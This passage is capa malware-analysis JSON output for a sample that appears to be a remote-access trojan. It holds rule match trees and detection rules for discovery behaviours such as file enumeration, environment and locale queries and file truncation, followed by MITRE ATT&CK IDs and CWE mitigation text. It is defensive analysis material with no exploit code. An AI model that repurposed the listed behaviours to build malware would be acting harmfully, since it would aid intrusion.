                                    }
                                  },
                                  "children": [],
                                  "locations": [
                                    {
                                      "type": "absolute",
                                      "value": 6442634008
                                    }
                                  ],
                                  "captures": {}
                                },
                                {
                                  "success": false,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "characteristic",
                                      "characteristic": "tight loop"
                                    }
                                  },
                                  "children": [],
                                  "locations": [],
                                  "captures": {}
                                },
                                {
                                  "success": false,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "characteristic",
                                      "characteristic": "recursive call"
                                    }
                                  },
                                  "children": [],
                                  "locations": [],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442634008
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "characteristic",
                              "characteristic": "indirect call"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "FindFirstFile"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "FindFirstFileEx"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442634376
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "FindFirstFileTransacted"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "FindFirstFileName"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "FindFirstFileNameTransacted"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "FindNextFile"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442634686
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "FindNextFileName"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "optional"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "FindClose"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442634794
                            },
                            {
                              "type": "absolute",
                              "value": 6442634750
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "match",
                              "match": "contain loop"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "or"
                                }
                              },
                              "children": [
                                {
                                  "success": true,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "characteristic",
                                      "characteristic": "loop"
                                    }
                                  },
                                  "children": [],
                                  "locations": [
                                    {
                                      "type": "absolute",
                                      "value": 6442634008
                                    }
                                  ],
                                  "captures": {}
                                },
                                {
                                  "success": false,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "characteristic",
                                      "characteristic": "tight loop"
                                    }
                                  },
                                  "children": [],
                                  "locations": [],
                                  "captures": {}
                                },
                                {
                                  "success": false,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "characteristic",
                                      "characteristic": "recursive call"
                                    }
                                  },
                                  "children": [],
                                  "locations": [],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442634008
                            }
                          ],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "query environment variable": {
        "meta": {
          "name": "query environment variable",
          "namespace": "host-interaction/environment-variable",
          "authors": [
            "michael.hunhoff@mandiant.com",
            "@_re_fox"
          ],
          "scopes": {
            "static": "function",
            "dynamic": "call"
          },
          "attack": [
            {
              "parts": [
                "Discovery",
                "System Information Discovery"
              ],
              "tactic": "Discovery",
              "technique": "System Information Discovery",
              "subtechnique": "",
              "id": "T1082"
            }
          ],
          "mbc": [
            {
              "parts": [
                "Discovery",
                "System Information Discovery"
              ],
              "objective": "Discovery",
              "behavior": "System Information Discovery",
              "method": "",
              "id": "E1082"
            }
          ],
          "references": [],
          "examples": [
            "Practical Malware Analysis Lab 14-02.exe_:0x401880",
            "0761142efbda6c4b1e801223de723578:0x65483490"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: query environment variable\r\n    namespace: host-interaction/environment-variable\r\n    authors:\r\n      - michael.hunhoff@mandiant.com\r\n      - \"@_re_fox\"\r\n    scopes:\r\n      static: function\r\n      dynamic: call\r\n    att&ck:\r\n      - Discovery::System Information Discovery [T1082]\r\n    mbc:\r\n      - Discovery::System Information Discovery [E1082]\r\n    examples:\r\n      - Practical Malware Analysis Lab 14-02.exe_:0x401880\r\n      - 0761142efbda6c4b1e801223de723578:0x65483490\r\n  features:\r\n    - or:\r\n      - api: kernel32.GetEnvironmentVariable\r\n      - api: kernel32.GetEnvironmentStrings\r\n      - api: kernel32.ExpandEnvironmentStrings\r\n      - api: msvcr90.getenv\r\n      - api: msvcrt.getenv\r\n      - api: System.Environment::GetEnvironmentVariable\r\n      - api: System.Environment::GetEnvironmentVariables\r\n      - api: System.Environment::ExpandEnvironmentVariables\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 6442638200
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetEnvironmentVariable"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetEnvironmentStrings"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442638225
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ExpandEnvironmentStrings"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "getenv"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.Environment::GetEnvironmentVariable"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.Environment::GetEnvironmentVariables"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.Environment::ExpandEnvironmentVariables"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "get geographical location": {
        "meta": {
          "name": "get geographical location",
          "namespace": "collection",
          "authors": [
            "moritz.raabe",
            "michael.hunhoff@mandiant.com"
          ],
          "scopes": {
            "static": "function",
            "dynamic": "call"
          },
          "attack": [
            {
              "parts": [
                "Discovery",
                "System Location Discovery"
              ],
              "tactic": "Discovery",
              "technique": "System Location Discovery",
              "subtechnique": "",
              "id": "T1614"
            }
          ],
          "mbc": [],
          "references": [],
          "examples": [
            "9879D201DC5ACA863F357184CD1F170E:0x10001A99"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "# generated using capa explorer for IDA Pro\r\nrule:\r\n  meta:\r\n    name: get geographical location\r\n    namespace: collection\r\n    authors:\r\n      - moritz.raabe\r\n      - michael.hunhoff@mandiant.com\r\n    scopes:\r\n      static: function\r\n      dynamic: call\r\n    att&ck:\r\n      - Discovery::System Location Discovery [T1614]\r\n    examples:\r\n      - 9879D201DC5ACA863F357184CD1F170E:0x10001A99\r\n  features:\r\n    - or:\r\n      - api: GetLocaleInfo\r\n      - api: GetLocaleInfoEx\r\n      - api: kernel32.GetUserGeoID\r\n      - api: kernel32.GetGeoInfo\r\n      # strings part of requests or parsed from response\r\n      # \"geo\" and \"zip\" are too short\r\n      # \"region\" results in FPs mostly related to memory\r\n      - string: /geolocation/i\r\n      - string: /geo-location/i\r\n      - string: /^city/i\r\n      - string: /region_code/i\r\n      - string: /region_name/i\r\n      - string: /^country/i\r\n      - string: /country_code/i\r\n      - string: /countrycode/i\r\n      - string: /country_name/i\r\n      - string: /continent_code/i\r\n      - string: /continent_name/i\r\n      - string: /^latitude/i\r\n      - string: /^longitude/i\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 6442656560
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetLocaleInfo"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442656615
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetLocaleInfoEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetUserGeoID"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetGeoInfo"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "regex",
                      "regex": "/geolocation/i"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "regex",
                      "regex": "/geo-location/i"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "regex",
                      "regex": "/^city/i"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "regex",
                      "regex": "/region_code/i"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "regex",
                      "regex": "/region_name/i"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "regex",
                      "regex": "/^country/i"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "regex",
                      "regex": "/country_code/i"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "regex",
                      "regex": "/countrycode/i"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "regex",
                      "regex": "/country_name/i"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "regex",
                      "regex": "/continent_code/i"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "regex",
                      "regex": "/continent_name/i"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "regex",
                      "regex": "/^latitude/i"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "regex",
                      "regex": "/^longitude/i"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "clear file content": {
        "meta": {
          "name": "clear file content",
          "namespace": "host-interaction/file-system/write",
          "authors": [
            "jakeperalta7"
          ],
          "scopes": {
            "static": "function",
            "dynamic": "span of calls"
          },
          "attack": [],
          "mbc": [
            {
              "parts": [
                "File System",
                "Writes File"
              ],
              "objective": "File System",
              "behavior": "Writes File",
              "method": "",
              "id": "C0052"
            }
          ],
          "references": [],
          "examples": [
            "e3a6fbbc9b315141da37e5abbae05bf20aa9f48d5f569c6353360f59a0315245:0x140001450"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: clear file content\r\n    namespace: host-interaction/file-system/write\r\n    authors:\r\n      - jakeperalta7\r\n    scopes:\r\n      static: function\r\n      dynamic: span of calls\r\n    mbc:\r\n      - File System::Writes File [C0052]\r\n    examples:\r\n      - e3a6fbbc9b315141da37e5abbae05bf20aa9f48d5f569c6353360f59a0315245:0x140001450\r\n  features:\r\n    - and:\r\n      - api: kernel32.SetEndOfFile\r\n      - not:\r\n        - api: kernel32.SetFilePointer\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 6442669068
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "SetEndOfFile"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442669363
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "not"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "SetFilePointer"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "contains PDB path": {
        "meta": {
          "name": "contains PDB path",
          "namespace": "executable/pe/pdb",
          "authors": [
            "moritz.raabe@mandiant.com"
          ],
          "scopes": {
            "static": "file",
            "dynamic": "file"
          },
          "attack": [],
          "mbc": [],
          "references": [],
          "examples": [
            "464EF2CA59782CE697BC329713698CCC"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: contains PDB path\r\n    namespace: executable/pe/pdb\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n    scopes:\r\n      static: file\r\n      dynamic: file\r\n    examples:\r\n      - 464EF2CA59782CE697BC329713698CCC  # level32.exe\r\n  features:\r\n    - string: /:\\\\.*\\.pdb/\r\n",
        "matches": [
          [
            {
              "type": "no address"
            },
            {
              "success": true,
              "node": {
                "type": "feature",
                "feature": {
                  "type": "regex",
                  "regex": "/:\\\\.*\\.pdb/"
                }
              },
              "children": [],
              "locations": [
                {
                  "type": "file",
                  "value": 281940
                }
              ],
              "captures": {
                "D:\\Msiexec sid-loding Rat\\leep\\Empty\\x64\\Release\\Empty.pdb": [
                  {
                    "type": "file",
                    "value": 281940
                  }
                ]
              }
            }
          ]
        ]
      }
    }
  },
  "MITRE": [
    "T1016.001",
    "T1033",
    "T1082",
    "T1083",
    "T1087",
    "T1129",
    "T1562.001",
    "T1614"
  ],
  "CWE": [
    [
      "compiler removal of code to clear buffers",
      "CWE-14",
      "::PHASE:Implementation:DESCRIPTION:Store the sensitive data in a volatile memory location if available.::PHASE:Build and Compilation:DESCRIPTION:If possible, configure your compiler so that it does not remove dead stores.::PHASE:Architecture and Design:DESCRIPTION:Where possible, encrypt sensitive data that are used by a software system.::"
    ],
    [
      "external control of system or configuration setting",
      "CWE-15",
      "::PHASE:Architecture and Design:STRATEGY:Separation of Privilege:DESCRIPTION:Compartmentalize the system to have safe areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area. Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges.::PHASE:Implementation Architecture and Design:DESCRIPTION:Because setting manipulation covers a diverse set of functions, any attempt at illustrating it will inevitably be incomplete. Rather than searching for a tight-knit relationship between the functions addressed in the setting manipulation category, take a step back and consider the sorts of system values that an attacker should not be allowed to control.::PHASE:Implementation Architecture and Design:DESCRIPTION:In general, do not allow user-provided or otherwise untrusted data to control sensitive values. The leverage that an attacker gains by controlling these values is not always immediately obvious, but do not underestimate the creativity of the attacker.::"
    ],
    [
      "path equivalence: windows 8.3 filename",
      "CWE-58",
      "::PHASE:System Configuration:DESCRIPTION:Disable Windows from supporting 8.3 filenames by editing the Windows registry. Preventing 8.3 filenames will not remove previously generated 8.3 filenames.::"
    ],
    [
      "external control of file name or path",
      "CWE-73",
      "::PHASE:Architecture and Design:DESCRIPTION:When the set of filenames is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames, and reject all other inputs. For example, ID 1 could map to inbox.txt and ID 2 could map to profile.txt. Features such as the ESAPI AccessReferenceMap provide this capability.::PHASE:Architecture and Design Operation:DESCRIPTION:Run your code in a jail or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict all access to files within a particular directory. Examples include the Unix chroot jail and AppArmor. In general, managed code may provide some protection. This may not be a feasible solution, and it only limits the impact to the operating system; the rest of your application may still be subject to compromise. Be careful to avoid CWE-243 and other weaknesses related to jails.::PHASE:Architecture and Design:DESCRIPTION:For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single . character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as / to avoid CWE-36. Use a list of allowable file extensions, which will help to avoid CWE-434. Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering / is insufficient protection if the filesystem also supports the use of as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ../ sequences are removed from the .../...// string in a sequential fashion, two instances of ../ would be removed from the original string, but the remaining characters would still form the ../ string.:EFFECTIVENESS:High::PHASE:Implementation:DESCRIPTION:Use a built-in path canonicalization function (such as realpath() in C) that produces the canonical version of the pathname, which effectively removes .. sequences and symbolic links (CWE-23, CWE-59).::PHASE:Installation Operation:DESCRIPTION:Use OS-level permissions and run as a low-privileged user to limit the scope of any successful attack.::PHASE:Operation Implementation:DESCRIPTION:If you are using PHP, configure your application so that it does not use register_globals. During implementation, develop your application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.::PHASE:Testing:DESCRIPTION:Use tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.::"
    ],
    [
      "improper neutralization of script in an error message web page",
      "CWE-81",
      "::PHASE:Implementation:DESCRIPTION:Do not write user-controlled input to error pages.::PHASE:Implementation:DESCRIPTION:Carefully check each input parameter against a rigorous positive specification (allowlist) defining the specific characters and format allowed. All input should be neutralized, not just parameters that the user is supposed to specify, but all data in the request, including hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. We often encounter data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended.::PHASE:Implementation:STRATEGY:Output Encoding:DESCRIPTION:Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component. The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.::PHASE:Implementation:DESCRIPTION:With Struts, write all data from form beans with the bean's filter attribute set to true.::PHASE:Implementation:STRATEGY:Attack Surface Reduction:DESCRIPTION:To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.:EFFECTIVENESS:Defense in Depth::"
    ],
    [
      "improper neutralization of script in attributes of img tags in a web page",
      "CWE-82",
      "::PHASE:Implementation:STRATEGY:Output Encoding:DESCRIPTION:Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component. The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.::PHASE:Implementation:STRATEGY:Attack Surface Reduction:DESCRIPTION:To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.:EFFECTIVENESS:Defense in Depth::"
    ],
    [
      "improper neutralization of script in attributes in a web page",
      "CWE-83",
      "::PHASE:Implementation:DESCRIPTION:Carefully check each input parameter against a rigorous positive specification (allowlist) defining the specific characters and format allowed. All input should be neutralized, not just parameters that the user is supposed to specify, but all data in the request, including tag attributes, hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. We often encounter data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended.::PHASE:Implementation:STRATEGY:Output Encoding:DESCRIPTION:Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component. The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.::PHASE:Implementation:DESCRIPTION:With Struts, write all data from form beans with the bean's filter attribute set to true.::PHASE:Implementation:STRATEGY:Attack Surface Reduction:DESCRIPTION:To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.:EFFECTIVENESS:Defense in Depth::"
    ],
    [
      "process control",
      "CWE-114",
      "::PHASE:Architecture and Design:STRATEGY:Libraries or Frameworks:DESCRIPTION:Libraries that are loaded should be well understood and come from a trusted source. The application can execute code contained in the native libraries, which often contain calls that are susceptible to other security problems, such as buffer overflows or command injection. All native libraries should be validated to determine if the application requires the use of the library. It is very difficult to determine what these native libraries actually do, and the potential for malicious code is high. In addition, the potential for an inadvertent mistake in these native libraries is also high, as many are written in C or C++ and may be susceptible to buffer overflow or race condition problems. To help prevent buffer overflow attacks, validate all input to native calls for content and length. If the native library does not come from a trusted source, review the source code of the library. The library should be built from the reviewed source before using it.::"
    ],
    [
      "improper validation of array index",
      "CWE-129",
      "::PHASE:Architecture and Design:STRATEGY:Input Validation:DESCRIPTION:Use an input validation framework such as Struts or the OWASP ESAPI Validation API. Note that using a framework does not automatically address all input validation problems; be mindful of weaknesses that could arise from misusing the framework itself (CWE-1173).::PHASE:Architecture and Design:DESCRIPTION:For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server. Even though client-side checks provide minimal benefits with respect to server-side security, they are still useful. First, they can support intrusion detection. If the server receives input that should have been rejected by the client, then it may be an indication of an attack. Second, client-side error-checking can provide helpful feedback to the user about the expectations for valid input. Third, there may be a reduction in server-side processing time for accidental input errors, although this is typically a small savings.::PHASE:Requirements:STRATEGY:Language Selection:DESCRIPTION:Use a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. For example, Ada allows the programmer to constrain the values of a variable and languages such as Java and Ruby will allow the programmer to handle exceptions when an out-of-bounds index is accessed.::PHASE:Operation Build and Compilation:STRATEGY:Environment Hardening:DESCRIPTION:Run or compile the software using features or extensions that randomly arrange the positions of a program's executable and libraries in memory. Because this makes the addresses unpredictable, it can prevent an attacker from reliably jumping to exploitable code. Examples include Address Space Layout Randomization (ASLR) [REF-58] [REF-60] and Position-Independent Executables (PIE) [REF-64]. Imported modules may be similarly realigned if their default memory addresses conflict with other modules, in a process known as rebasing (for Windows) and prelinking (for Linux) [REF-1332] using randomly generated addresses. ASLR for libraries cannot be used in conjunction with prelink since it would require relocating the libraries at run-time, defeating the whole purpose of prelinking. For more information on these techniques see D3-SAOR (Segment Address Offset Randomization) from D3FEND [REF-1335].:EFFECTIVENESS:Defense in Depth::PHASE:Operation:STRATEGY:Environment Hardening:DESCRIPTION:Use a CPU and operating system that offers Data Execution Protection (using hardware NX or XD bits) or the equivalent techniques that simulate this feature in software, such as PaX [REF-60] [REF-61]. These techniques ensure that any instruction executed is exclusively at a memory address that is part of the code segment. For more information on these techniques see D3-PSEP (Process Segment Execution Prevention) from D3FEND [REF-1336].:EFFECTIVENESS:Defense in Depth::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as 